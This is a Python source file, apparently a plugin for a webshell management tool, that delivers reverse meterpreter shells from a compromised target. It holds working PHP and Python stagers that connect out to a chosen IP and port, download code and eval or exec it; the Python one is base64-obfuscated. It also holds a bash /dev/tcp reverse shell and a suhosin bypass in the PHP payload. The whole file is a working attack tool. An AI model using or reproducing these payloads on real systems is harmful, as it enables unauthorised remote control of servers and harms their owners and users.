from threading import Thread
from time import sleep
from base64 import b64encode
from libs.config import alias, color, gget
from libs.myapp import is_windows, get_system_code, send


def get_php_meterpreter(ip:str,port:int):
    php = """
    /*<?php /**/ error_reporting(0); $ip = '""" + ip +"""'; $port = """+ str(port) +"""; if (($f = 'stream_socket_client') && is_callable($f)) { $s = $f("tcp://{$ip}:{$port}"); $s_type = 'stream'; } if (!$s && ($f = 'fsockopen') && is_callable($f)) { $s = $f($ip, $port); $s_type = 'stream'; } if (!$s && ($f = 'socket_create') && is_callable($f)) { $s = $f(AF_INET, SOCK_STREAM, SOL_TCP); $res = @socket_connect($s, $ip, $port); if (!$res) { die(); } $s_type = 'socket'; } if (!$s_type) { die('no socket funcs'); } if (!$s) { die('no socket'); } switch ($s_type) { case 'stream': $len = fread($s, 4); break; case 'socket': $len = socket_read($s, 4); break; } if (!$len) { die(); } $a = unpack("Nlen", $len); $len = $a['len']; $b = ''; while (strlen($b) < $len) { switch ($s_type) { case 'stream': $b .= fread($s, $len-strlen($b)); break; case 'socket': $b .= socket_read($s, $len-strlen($b)); break; } } $GLOBALS['msgsock'] = $s; $GLOBALS['msgsock_type'] = $s_type; if (extension_loaded('suhosin') && ini_get('suhosin.executor.disable_eval')) { $suhosin_bypass=create_function('', $b); $suhosin_bypass(); } else { eval($b); } die();
    """
    t = Thread(target=send, args=(php,))
    t.setDaemon(True)
    t.start()
    return t

def get_python_meterpreter(ip:str,port:int):
    python = """import socket,zlib,base64,struct,time
for x in range(10):
	try:
		s=socket.socket(2,socket.SOCK_STREAM)
		s.connect(('"""+ip+"""',"""+str(port)+"""))
		break
	except:
		time.sleep(5)
l=struct.unpack('>I',s.recv(4))[0]
d=s.recv(l)
while len(d)<l:
	d+=s.recv(l-len(d))
exec(zlib.decompress(base64.b64decode(d)),{'s':s})
    """
    execgo = f"""exec(__import__('base64').b64decode(__import__('codecs').getencoder('utf-8')('{b64encode(python.encode("utf-8")).decode("utf-8")}')[0]))"""
    php = get_system_code(f'python -c "{execgo}"')
    t = Thread(target=send, args=(php,))
    t.setDaemon(True)
    t.start()
    return t

def get_bash_cmd(ip:str,port:int):
    bash = f"""bash -c '0<&159-;exec 159<>/dev/tcp/{ip}/{int(port)};sh <&159 >&159 2>&159' """
    php = get_system_code(bash)
    t = Thread(target=send, args=(php,))
    t.setDaemon(True)
    t.start()
    return t

@alias(True, func_alias="remp", _type="SHELL", p="port", type="reverse_type")
def run(ip: str, port: str, reverse_type: str = "php"):
    """
    remp

    reverse meterpreter shell to a host from target system.
    eg: reverse {ip} {port} {type=php}

    reverse_type:
      - php(php/meterpreter/reverse_tcp)
      - python(python/meterpreter/reverse_tcp)
      - bash(cmd/unix/reverse_bash)
    """
    reverse_type = str(reverse_type).lower()
    if reverse_type == "php":
        t = get_php_meterpreter(ip=ip,port=int(port))
    elif reverse_type == "python":
        t = get_python_meterpreter(ip=ip,port=int(port))
    elif reverse_type == "bash":
        t = get_bash_cmd(ip=ip,port=int(port))
    else:
        print(color.red("Reverse type Error."))
        return
    sleep(1)
    if (t.isAlive()):
        print(f"\nReverse meterpreter shell to {ip}:{port} {color.green('success')}.\n")
    else:
        print(f"\nReverse meterpreter shell {color.red('error')}.\n")
